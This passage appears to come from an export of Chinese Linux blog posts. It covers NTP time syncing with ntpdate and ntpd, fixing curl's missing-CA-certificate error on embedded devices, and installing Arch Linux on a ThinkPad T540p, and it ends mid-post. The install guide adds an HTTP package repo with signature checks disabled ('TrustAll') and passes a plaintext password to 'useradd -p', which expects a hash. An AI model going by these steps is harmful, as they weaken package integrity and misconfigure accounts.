href=\"#coderef-ntpdate_debug_offset\"class=\"coderef\" onmouseover=\"CodeHighlightOn(this, 'coderef-ntpdate_debug_offset');\" onmouseout=\"CodeHighlightOff(this, 'coderef-ntpdate_debug_offset');\">26</a>  </dt><dd>本机时间比时间服务器慢了 3542.028898 秒\n</dd>\n</dl>\n\n<p>\n不带 -d 选项，修改本地时间\n</p>\n<pre class=\"example\">\n# ntpdate s1a.time.edu.cn\nntpdate s1a.time.edu.cn\n 9 Mar 19:51:51 ntpdate[20553]: step time server 202.112.10.60 offset 3542.052347 sec\n</pre>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2-2\" class=\"outline-3\">\n<h3 id=\"sec-2-2\">定期自动同步时间</h3>\n<div class=\"outline-text-3\" id=\"text-2-2\">\n<p>\n长时间运行的系统，会与标准时间产生偏差，通过 crontab 每日运行一次\n</p>\n\n<p>\n<code>/etc/cron.daily/ntpdate</code>\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #999999; font-style: italic;\">#</span><span style=\"color: #999999; font-style: italic;\">!/bin/</span><span style=\"color: #99cc99;\">bash</span>\n\n/usr/sbin/ntpdate s1a.time.edu.cn &gt;/dev/null 2&gt;&amp;1\n</pre>\n</div>\n\n<p>\n请记得为 <code>/etc/cron.daily/ntpdate</code> 添加可执行权限。\n</p>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">使用 ntpd 服务同步时间</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<dl class=\"org-dl\">\n<dt> ntpd </dt><dd>Network Time Protocol (NTP) Daemon\nThe ntpd program is an operating system daemon that synchronizes the system clock to remote NTP time servers or local reference clocks.\n</dd>\n</dl>\n\n\n<p>\nntpd 服务的配置文件为 /etc/ntp.conf 。\n</p>\n\n<p>\nntpd 如果时间偏差过大（默认 1000 秒钟），ntpd 会输出错误到系统日志后退出，所以在服务启动前需要先同步好时间。\n</p>\n\n<p>\n某嵌入式系统上的 ntpd 服务脚本：\n</p>\n\n<p>\n<code>/etc/init.d/S49ntp</code>\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #999999; font-style: italic;\">#</span><span style=\"color: #999999; font-style: italic;\">! /bin/</span><span style=\"color: #99cc99;\">sh</span>\n<span style=\"color: #999999; font-style: italic;\">#</span>\n<span style=\"color: #999999; font-style: italic;\"># </span><span style=\"color: #999999; font-style: italic;\">System-V init script for the openntp daemon</span>\n<span style=\"color: #999999; font-style: italic;\">#</span>\n\n<span style=\"color: #ffcc66;\">PATH</span>=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n<span style=\"color: #ffcc66;\">DESC</span>=<span style=\"color: #66cccc;\">\"network time protocol daemon\"</span>\n<span style=\"color: #ffcc66;\">NAME</span>=ntpd\n<span style=\"color: #ffcc66;\">DAEMON</span>=/usr/sbin/$<span style=\"color: #ffcc66;\">NAME</span>\n<span style=\"color: #ffcc66;\">NTPDATE_BIN</span>=/usr/bin/ntpdate\n\n<span style=\"color: #999999; font-style: italic;\"># </span><span style=\"color: #999999; font-style: italic;\">Gracefully exit if the package has been removed.</span>\n<span style=\"color: #cc99cc;\">test</span> -x $<span style=\"color: #ffcc66;\">DAEMON</span> || <span style=\"color: #99cc99;\">exit</span> 0\n\n<span style=\"color: #999999; font-style: italic;\"># </span><span style=\"color: #999999; font-style: italic;\">Read config file if it is present.</span>\n<span style=\"color: #99cc99;\">if</span> [ -r /etc/default/$<span style=\"color: #ffcc66;\">NAME</span> ]\n<span style=\"color: #99cc99;\">then</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cc99cc;\">.</span> /etc/default/$<span style=\"color: #ffcc66;\">NAME</span>\n<span style=\"color: #99cc99;\">fi</span>\n\n<span style=\"color: #99cc99;\">case</span> <span style=\"color: #66cccc;\">\"$1\"</span><span style=\"color: #99cc99;\"> in</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span> start)\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> [ -x $<span style=\"color: #ffcc66;\">NTPDATE_BIN</span> ] ; <span style=\"color: #99cc99;\">then</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cc99cc;\">echo</span> -n <span style=\"color: #66cccc;\">\"Getting initial time via ntp\"</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $<span style=\"color: #ffcc66;\">NTPDATE_BIN</span> $<span style=\"color: #ffcc66;\">NTPDATE_OPTS</span> $<span style=\"color: #ffcc66;\">NTPSERVERS</span> &gt; /dev/null 2&gt;&amp;1\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cc99cc;\">echo</span> <span style=\"color: #66cccc;\">\".\"</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">fi</span>\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cc99cc;\">echo</span> -n <span style=\"color: #66cccc;\">\"Starting $DESC: $NAME\"</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   start-stop-daemon -S -q -x $<span style=\"color: #ffcc66;\">DAEMON</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cc99cc;\">echo</span> <span style=\"color: #66cccc;\">\".\"</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   ;;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span> stop) <span style=\"color: #cc99cc;\">echo</span> -n <span style=\"color: #66cccc;\">\"Stopping $DESC: $NAME\"</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   start-stop-daemon -K -q -n $<span style=\"color: #ffcc66;\">NAME</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cc99cc;\">echo</span> <span style=\"color: #66cccc;\">\".\"</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   ;;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span> reload|force-reload) <span style=\"color: #cc99cc;\">echo</span> -n <span style=\"color: #66cccc;\">\"Reloading $DESC configuration...\"</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   start-stop-daemon -K -q -n $<span style=\"color: #ffcc66;\">NAME</span> -s 1\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cc99cc;\">echo</span> <span style=\"color: #66cccc;\">\"done.\"</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span> ;;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span> restart) <span style=\"color: #cc99cc;\">echo</span> <span style=\"color: #66cccc;\">\"Restarting $DESC: $NAME\"</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $<span style=\"color: #ffcc66;\">0</span> stop\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   sleep 1\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $<span style=\"color: #ffcc66;\">0</span> start\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   ;;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span> *) <span style=\"color: #cc99cc;\">echo</span> <span style=\"color: #66cccc;\">\"Usage: $SCRIPTNAME {start|stop|restart|reload|force-reload}\"</span> &gt;&amp;2\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">exit</span> 1\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   ;;\n<span style=\"color: #99cc99;\">esac</span>\n\n<span style=\"color: #99cc99;\">exit</span> 0\n</pre>\n</div>\n\n<p>\n其中 $NTPDATE_OPTS 定义在 /etc/default/ntpd 中：\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #ffcc66;\">NTPDATE_OPTS</span>=<span style=\"color: #66cccc;\">\"-t 5\"</span>\n</pre>\n</div>\n\n<p>\n通过 ntpdate 同步初始时间失败，ntpd 服务可能因为当前系统时间与时间服务器偏差过大而退出。\n</p>\n\n<p>\n同步失败的原因：\n</p>\n\n<ul class=\"org-ul\">\n<li>开机后网络尚未连通\n</li>\n\n<li>时间服务器繁忙\n</li>\n\n<li>网络环境限制使用 NTP 协议\n</li>\n\n<li>命令执行超时\n\n<p>\n域名解析、网络请求处理都会占用时间，5 秒钟不一定能完成。\n</p>\n</li>\n</ul>\n\n<p>\n由于脚本是在系统启动过程中运行，再延长超时时间可能导致开机启动时间变长。\n</p>\n\n<p>\n可以配置 ntpd 在时间偏差过大时仍然同步时间（注意：ntpd 第一次需要 4-5 分钟才能完成同步），有以下几种方法：\n</p>\n\n<ul class=\"org-ul\">\n<li>添加 -g 命令行选项\n\n<p>\n<code>-g</code> 本地时间与时间服务器偏差达过大（默认为 1000 秒）时，不退出，同步一次时间。\n</p>\n</li>\n\n<li>设置 NTPD_PANICGATE 环境变量\n\n<p>\n绝大部分命令行选项都可以通过加 NTPD_ 前缀的环境变量进行设置。\n</p>\n</li>\n\n<li>修改配置文件\n\n<p>\n将以下内容添加到 /etc/ntp.conf 最前面\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">tinker panic 0\n</pre>\n</div>\n</li>\n</ul>\n</div>\n\n<div id=\"outline-container-sec-3-1\" class=\"outline-3\">\n<h3 id=\"sec-3-1\">手工同步一次</h3>\n<div class=\"outline-text-3\" id=\"text-3-1\">\n<p>\n通过 ntpd 的命令行选项可以更好地完成 ntpdate 的功能。\n</p>\n\n<p>\n<code>-q</code> 同步一次后退出。\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">ntpd -g -q\n</pre>\n</div>\n\n<p>\n上面的命令会确保同步一次时间后结束。\n</p>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">参考</h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n<ul class=\"org-ul\">\n<li><a href=\"http://blog.csdn.net/suer0101/article/details/7868813\">使用ntpdate更新系统时间</a>\n</li>\n\n<li><a href=\"http://acooly.iteye.com/blog/1993484\">NTP服务及时间同步(CentOS6.x)</a>\n</li>\n\n<li><a href=\"http://www.psce.com/blog/kb/how-to-periodically-synchronize-time-in-linux/\">How to periodically synchronize time in Linux?</a>\n</li>\n\n<li><a href=\"http://www.tldp.org/LDP/sag/html/basic-ntp-config.html\">Basic NTP configuration</a>\n</li>\n\n<li><a href=\"http://linux.die.net/man/8/ntpd\">ntpd(8): Network Time Protocol daemon - Linux man page</a>\n</li>\n\n<li><a href=\"http://askubuntu.com/a/443077/397632\">How to force a clock update using ntp? - Ask Ubuntu</a>\n</li>\n</ul>\n</div>\n</div>\n"
},
{
  "title": "修复 SSL certificate problem: unable to get local issuer certificate",
  "timestamp": "2016-03-14 20:36:00",
  "tags": [
    "openssl",
    "security",
    "network"
  ],
  "body": "<p>\n在嵌入式 linux 设备上使用 curl 访问 https 站点会报错：\n</p>\n<pre class=\"example\">\n# curl https://www.google.com\ncurl: (60) SSL certificate problem: unable to get local issuer certificate\nMore details here: http://curl.haxx.se/docs/sslcerts.html\n\ncurl performs SSL certificate verification by default, using a \"bundle\"\n of Certificate Authority (CA) public keys (CA certs). If the default\n bundle file isn't adequate, you can specify an alternate file\n using the --cacert option.\nIf this HTTPS server uses a certificate signed by a CA represented in\n the bundle, the certificate verification probably failed due to a\n problem with the certificate (it might be expired, or the name might\n not match the domain name in the URL).\nIf you'd like to turn off curl's verification of the certificate, use\n the -k (or --insecure) option.\n</pre>\n\n<p>\n而 linux 桌面上使用 curl 访问 https 站点则正常：\n</p>\n<pre class=\"example\">\n$ curl https://www.google.com\n&lt;HTML&gt;&lt;HEAD&gt;&lt;meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\"&gt;\n&lt;TITLE&gt;302 Moved&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;\n&lt;H1&gt;302 Moved&lt;/H1&gt;\nThe document has moved\n&lt;A HREF=\"https://www.google.com.hk/?gfe_rd=cr&amp;amp;ei=i2DmVtXLDOzN8geg-afACA\"&gt;here&lt;/A&gt;.\n&lt;/BODY&gt;&lt;/HTML&gt;\n</pre>\n\n<p>\n嵌入式 linux 设备上缺少了 CA 证书。\n</p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">什么是 CA 证书</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<blockquote>\n<p>\nCertificate Authority (CA) Certificates\n</p>\n\n<p>\nA certificate authority (CA) is a trusted entity that issues electronic documents that verify a digital entity’s identity on the Internet. The electronic documents, which are called digital certificates, are an essential part of secure communication and play an important part in the public key infrastructure (PKI). Certificates typically include the owner's public key, the expiration date of the certificate, the owner's name and other information about the public key owner.\n</p>\n</blockquote>\n<p>\n引用自 <a href=\"http://searchsecurity.techtarget.com/definition/certificate-authority\">What is certificate authority (CA)? - Definition from WhatIs.com</a>\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">获取 CA 证书</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n比较有名的 CA 证书列表由 mozilla 维护，<a href=\"https://curl.haxx.se/\">curl</a> 提供了命令行工具 <a href=\"https://github.com/curl/curl/raw/master/lib/mk-ca-bundle.pl\">mk-ca-bundle.pl</a> ，用于下载 mozilla 维护的 CA 证书列表，转换成 SSL 应用程序可直接使用的格式。\n</p>\n\n<p>\nlinux 系统的 CA 证书由操作系统发行版负责维护，没有统一的标准规定如何维护和管理 CA 证书。\n</p>\n\n<p>\nArchlinux 的 CA 证书由 <a href=\"https://www.archlinux.org/packages/core/any/ca-certificates/\">ca-certificates</a> 包维护，CA 证书来自依赖的包 <a href=\"https://www.archlinux.org/packages/core/i686/ca-certificates-mozilla/\">ca-certificates-mozilla</a> 及 <a href=\"https://www.archlinux.org/packages/core/any/ca-certificates-cacert/\">ca-certificates-cacert</a> 。\n</p>\n<pre class=\"example\">\n$ pacman -Qi ca-certificates\nName            : ca-certificates\nVersion         : 20150402-1\nDescription     : Common CA certificates (default providers)\nArchitecture    : any\nURL             : http://pkgs.fedoraproject.org/cgit/ca-certificates.git\nLicenses        : GPL2\nGroups          : None\nProvides        : None\nDepends On      : ca-certificates-mozilla  ca-certificates-cacert\nOptional Deps   : None\nRequired By     : curl  glib-networking  mono  neon  perl-lwp-protocol-https  qt4\nOptional For    : lib32-openssl  openssl  wget\nConflicts With  : None\nReplaces        : None\nInstalled Size  : 1024.00 B\nPackager        : Jan Alexander Steffens (heftig) &lt;jan.steffens@gmail.com&gt;\nBuild Date      : 2015年04月03日 星期五 04时36分52秒\nInstall Date    : 2015年04月13日 星期一 16时04分37秒\nInstall Reason  : Installed as a dependency for another package\nInstall Script  : No\nValidated By    : Signature\n$ pacman -Ql ca-certificates\n$ pacman -Ql ca-certificates-cacert\nca-certificates-cacert /usr/\nca-certificates-cacert /usr/share/\nca-certificates-cacert /usr/share/ca-certificates/\nca-certificates-cacert /usr/share/ca-certificates/trust-source/\nca-certificates-cacert /usr/share/ca-certificates/trust-source/anchors/\nca-certificates-cacert /usr/share/ca-certificates/trust-source/anchors/CAcert.org_class3.crt\nca-certificates-cacert /usr/share/ca-certificates/trust-source/anchors/CAcert.org_root.crt\nca-certificates-cacert /usr/share/licenses/\nca-certificates-cacert /usr/share/licenses/ca-certificates-cacert/\nca-certificates-cacert /usr/share/licenses/ca-certificates-cacert/LICENSE\n$ pacman -Ql ca-certificates-mozilla\nca-certificates-mozilla /usr/\nca-certificates-mozilla /usr/share/\nca-certificates-mozilla /usr/share/ca-certificates/\nca-certificates-mozilla /usr/share/ca-certificates/trust-source/\nca-certificates-mozilla /usr/share/ca-certificates/trust-source/mozilla.neutral-trust.crt\nca-certificates-mozilla /usr/share/ca-certificates/trust-source/mozilla.supplement.p11-kit\nca-certificates-mozilla /usr/share/ca-certificates/trust-source/mozilla.trust.crt\n</pre>\n\n<p>\n拷贝 Archlinux 的 CA 证书文件 /etc/ssl/certs/ca-certificates.crt 到嵌入式 linux 设备，\ncurl 编译时需要通过 <code>--with-ca-bundle</code> 指定默认的 CA 证书文件，运行时通过 <code>--cacert</code> 选项指定\n</p>\n<pre class=\"example\">\n# curl https://www.google.com --cacert /etc/ssl/certs/ca-certificates.crt\n&lt;HTML&gt;&lt;HEAD&gt;&lt;meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\"&gt;\n&lt;TITLE&gt;302 Moved&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;\n&lt;H1&gt;302 Moved&lt;/H1&gt;\nThe document has moved\n&lt;A HREF=\"https://www.google.com.hk/?gfe_rd=cr&amp;amp;ei=LoDmVuXlB9TC8gecrZv4DA\"&gt;here&lt;/A&gt;.\n&lt;/BODY&gt;&lt;/HTML&gt;\n</pre>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">更新 CA 证书</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n</div><div id=\"outline-container-sec-3-1\" class=\"outline-3\">\n<h3 id=\"sec-3-1\">使用 openwrt 的嵌入式设备</h3>\n<div class=\"outline-text-3\" id=\"text-3-1\">\n<p>\n可以通过 opkg 进行安装和更新 CA 证书文件\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">opkg install ca-certificates\nopkg upgrade ca-certificates\n</pre>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3-2\" class=\"outline-3\">\n<h3 id=\"sec-3-2\">使用 linux 的嵌入式设备</h3>\n<div class=\"outline-text-3\" id=\"text-3-2\">\n<p>\n如果没有软件包管理器，可以从 linux 服务器上定时下载最新的 CA 证书文件。\n</p>\n\n<p>\nlinux 服务器上的 CA 证书文件可以通过两种方式更新\n</p>\n\n<ul class=\"org-ul\">\n<li>更新 ca-certificates 软件包\n\n<p>\nCentOS 6.4\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">yum update ca-certificates\n</pre>\n</div>\n\n<p>\nCentOS 6.4 的 CA 证书文件 /etc/pki/tls/certs/ca-bundle.crt\n</p>\n</li>\n\n<li><a href=\"https://github.com/curl/curl/raw/master/lib/mk-ca-bundle.pl\">mk-ca-bundle.pl</a> 脚本生成最新的 CA 证书文件\n\n<p>\n该脚本生成的 CA 证书文件包含 mozilla 维护的证书\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">mk-ca-bundle.pl -q ca-bundle.crt\n</pre>\n</div>\n</li>\n</ul>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">参考</h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n<ul class=\"org-ul\">\n<li><a href=\"https://en.wikipedia.org/wiki/Root_certificate\">Root certificate - Wikipedia, the free encyclopedia</a>\n</li>\n\n<li><a href=\"https://curl.haxx.se/docs/sslcerts.html\">cURL - SSL CA Certificates</a>\n</li>\n\n<li><a href=\"https://gist.github.com/jjb/996292\">How to securely acquire the Mozilla root certificate bundle for use with curl, Net::HTTP, etc.</a>\n</li>\n\n<li><a href=\"https://curl.haxx.se/docs/mk-ca-bundle.html\">mk-ca-bundle</a>\n</li>\n\n<li><a href=\"https://wiki.openwrt.org/doc/howto/wget-ssl-certs\">SSL and Certificates in wget - OpenWrt Wiki</a>\n</li>\n\n<li><a href=\"https://www.happyassassin.net/2015/01/12/a-note-about-ssltls-trusted-certificate-stores-and-platforms/\">A note about SSL/TLS trusted certificate stores, and platforms (OpenSSL and GnuTLS)</a>\n</li>\n\n<li><a href=\"http://searchsecurity.techtarget.com/definition/certificate-authority\">What is certificate authority (CA)? - Definition from WhatIs.com</a>\n</li>\n\n<li><a href=\"https://projects.archlinux.org/svntogit/packages.git/tree/trunk/PKGBUILD?h=packages/curl\">PKGBUILD of curl on Archlinux</a>\n</li>\n</ul>\n</div>\n</div>\n"
},
{
  "title": "Thinkpad T540p 安装 Archlinux",
  "timestamp": "2016-03-17 18:09:00",
  "tags": [
    "thinkpad",
    "archlinux"
  ],
  "body": "<p>\n如果你是重新安装 Archlinux 则建议在安装前记录一下现有系统的软件列表，方便装完新系统后继续安装需要的软件\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">pacman -Qqe | grep -vx <span style=\"color: #66cccc;\">\"$(</span><span style=\"color: #cc99cc;\">pacman</span><span style=\"color: #66cccc;\"> -Qqm)\"</span> &gt; Packages\npacman -Qqm &gt; Packages.aur\n</pre>\n</div>\n\n<p>\n参考\n</p>\n\n<ul class=\"org-ul\">\n<li><a href=\"https://wiki.archlinux.org/index.php/migrate_installation_to_new_hardware\">Migrate installation to new hardware - ArchWiki</a>\n</li>\n</ul>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">下载 ISO</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\n从 <a href=\"https://www.archlinux.org\">Archlinux 官网</a> 下载最新的安装包 <a href=\"https://www.archlinux.org/download/\">archlinux-2016.03.01-dual.iso</a>\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">创建安装盘</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n通过 dd 将 ISO 写入 U 盘创建安装盘。\n</p>\n\n<p>\n参考\n</p>\n\n<ul class=\"org-ul\">\n<li><a href=\"https://wiki.archlinux.org/index.php/USB_flash_installation_media_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)#GNU.2FLinux\">USB flash installation media (简体中文) - ArchWiki</a>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">BIOS 启用 UEFI</h2>\n</div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">开始安装</h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n<p>\n按照 <a href=\"https://wiki.archlinux.org/index.php/Beginners'_guide\">Beginners' guide - ArchWiki</a> 一步步安装到 <a href=\"https://wiki.archlinux.org/index.php/Beginners'_guide#Initramfs\">Initramfs</a> ，分区分案选 <a href=\"https://wiki.archlinux.org/index.php/Beginners'_guide#UEFI.2FGPT_examples\">UEFI/GPT</a>。\n</p>\n\n<p>\n<a href=\"https://wiki.archlinux.org/index.php/Beginners'_guide#Install_a_boot_loader\">Install a boot loader</a> 这一步改成 <a href=\"#sec-5\">使用 UEFI 做为启动管理器</a> 。\n</p>\n\n\n<p>\n针对固态硬盘的优化建议\n</p>\n\n<ul class=\"org-ul\">\n<li>格式化 ext4 分区时添加选项 4K 对齐\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">mkfs.ext4 -b 4096 /dev/sdXX\n</pre>\n</div>\n</li>\n\n<li>挂载 ext4 分区时添加选项 discard,noatime\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">mount -t ext4 /dev/sdXX /mnt -o discard,noatime\n</pre>\n</div>\n\n<p>\nnoatime 读取文件的时候不修改读取的时间，减少对 ssd 的写入次数\ndiscard 启动 trim\n</p>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-5\" class=\"outline-2\">\n<h2 id=\"sec-5\">使用 UEFI 做为启动管理器</h2>\n<div class=\"outline-text-2\" id=\"text-5\">\n<p>\n由于主板直接支持 UEFI 启动，使用 efibootmgr 来创建 Boot Loader 不但更简单，而且系统启动更快。\n</p>\n\n<p>\n参考\n</p>\n\n<ul class=\"org-ul\">\n<li><a href=\"https://wiki.archlinux.org/index.php/EFISTUB#Using_UEFI_directly_.28efibootmgr.29\">EFISTUB - Using UEFI directly (efibootmgr) - ArchWiki</a>\n</li>\n\n<li><a href=\"http://superuser.com/questions/912417/i-wanted-to-install-arch-linux-on-a-uefi-gpt-system-and-had-questions-about-the/912435#912435\">I wanted to install arch linux on a UEFI/GPT system and had questions about the process - Super User</a>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-6\" class=\"outline-2\">\n<h2 id=\"sec-6\">开通 sudo 权限组</h2>\n<div class=\"outline-text-2\" id=\"text-6\">\n<p>\n运行 visudo，修改如下\n</p>\n\n<pre class=\"example\">\n## Uncomment to allow members of group wheel to execute any command\n%wheel ALL=(ALL) ALL\n</pre>\n\n<dl class=\"org-dl\">\n<dt> wheel </dt><dd>为 sudo 权限组   \n</dd>\n</dl>\n</div>\n</div>\n\n<div id=\"outline-container-sec-7\" class=\"outline-2\">\n<h2 id=\"sec-7\">创建个人帐号</h2>\n<div class=\"outline-text-2\" id=\"text-7\">\n<p>\n加入 sudo 权限组\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">useradd tangxinfa -m -G wheel -p password\n</pre>\n</div>\n\n<dl class=\"org-dl\">\n<dt> tangxinfa </dt><dd>为个人帐号名称，请自行修改\n</dd>\n\n<dt> password </dt><dd>为个人帐号密码，请自行修改\n</dd>\n\n<dt> wheel </dt><dd>为 sudo 权限组\n</dd>\n</dl>\n\n\n<p>\n接下来的操作可以切到个人帐号了。\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">su - tangxinfa\n</pre>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-8\" class=\"outline-2\">\n<h2 id=\"sec-8\">安装 gnome 桌面</h2>\n<div class=\"outline-text-2\" id=\"text-8\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo pacman -S gnome gnome-extra gdm\nsudo systemctl enable gdm\nsudo systemctl -f enable graphical.target\nsudo systemctl enable NetworkManager\n</pre>\n</div>\n\n<p>\n参考\n</p>\n\n<ul class=\"org-ul\">\n<li><a href=\"https://wiki.archlinux.org/index.php/GNOME_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)\">GNOME (简体中文) - ArchWiki</a>\n</li>\n\n<li><a href=\"https://wiki.archlinux.org/index.php/GDM_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)\">GDM (简体中文) - ArchWiki</a>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-9\" class=\"outline-2\">\n<h2 id=\"sec-9\">安装 fcitx 输入法</h2>\n<div class=\"outline-text-2\" id=\"text-9\">\n<p>\n参考\n</p>\n\n<ul class=\"org-ul\">\n<li><a href=\"http://blog.kankanan.com/article/archlinux-4e0b5b8988c5-fcitx-8f9351656cd5.html\">Archlinux下安装fcitx输入法 | 看看俺 – KanKanAn.com</a>\n</li>\n\n<li><a href=\"https://wiki.archlinux.org/index.php/Fcitx\">Fcitx - ArchWiki</a>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-10\" class=\"outline-2\">\n<h2 id=\"sec-10\">安装 yaourt</h2>\n<div class=\"outline-text-2\" id=\"text-10\">\n<dl class=\"org-dl\">\n<dt> yaourt </dt><dd>Yet AnOther User Repository Tool\n</dd>\n</dl>\n\n\n<p>\n封装了 pacman，支持安装用户软件仓库里的软件包。\n</p>\n\n<p>\n<code>/etc/pacman.conf</code> 添加配置\n</p>\n<pre class=\"example\">\n[archlinuxfr]\nSigLevel = Optional TrustAll\nServer = http://repo.archlinux.fr/$arch\n</pre>\n\n<p>\n安装 yaourt\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">pacman -S yaourt\n</pre>\n</div>\n\n<p>\n参考\n</p>\n\n<ul class=\"org-ul\">\n<li><a href=\"http://bashell.nodemedia.cn/archives/install-yaourt.html\">Yaourt的安装及使用 | 贝壳博客</a>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-11\" class=\"outline-2\">\n<h2 id=\"sec-11\">触摸板</h2>\n<div class=\"outline-text-2\" id=\"text-11\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">yaourt -S xf86-input-synaptics\n</pre>\n</div>\n\n<ul class=\"org-ul\">\n<li>触摸板调优\n\n<p>\n<a href=\"http://blog.kankanan.com/article/thinkpad-t540p-4fee590d-linux-4e0b89e66478677f63094e0b65f6514968074f4d7f6e79fb52a895ee9898.html\">Thinkpad T540p修复linux下触摸板按下时光标位置移动问题 | 看看俺 – KanKanAn.com</a>\n</p>\n\n<p>\n为避免打字时误触，在 ~/.xprofile 中添加以下内容：\n</p>\n<pre class=\"example\">\nsyndaemon -d -i 2 -t\n</pre>\n</li>\n\n<li>触摸板失灵\n\n<p>\n移动光标位置却是滚动效果（就像是单指操作变成双指操作了），移动光标时位置卡顿。\n</p>\n\n<p>\n安装 evtest\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">yaourt -S evtest\n</pre>\n</div>\n\n<p>\n获取触摸板事件号\n</p>\n<pre class=\"example\">\n$ cat /proc/bus/input/devices | grep Synaptics -A 10 | grep event\nH: Handlers=event15 mouse1\n</pre>\n\n<p>\n检测触摸板事件\n</p>\n<pre class=\"example\">\n$ sudo evtest /dev/input/event15\n</pre>\n\n<p>\n发现触摸板失灵时，也有触模板压下事件产生，估计是硬件不灵敏了，应该可以通过调整相关参数忽略掉 <code>man</code> <code>synaptics</code> 